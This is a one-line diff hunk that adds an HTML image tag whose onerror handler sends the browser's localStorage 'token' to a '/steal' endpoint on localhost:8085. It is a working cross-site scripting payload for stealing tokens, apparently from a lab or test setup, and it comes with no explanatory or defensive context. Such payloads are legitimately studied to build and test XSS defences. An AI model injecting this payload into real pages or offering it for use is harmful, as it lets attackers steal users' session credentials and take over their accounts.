@@ -1,0 +1,1 @@
+<img src="" onerror="fetch('http://localhost:8085/steal?param='+localStorage.getItem('token'))"/>
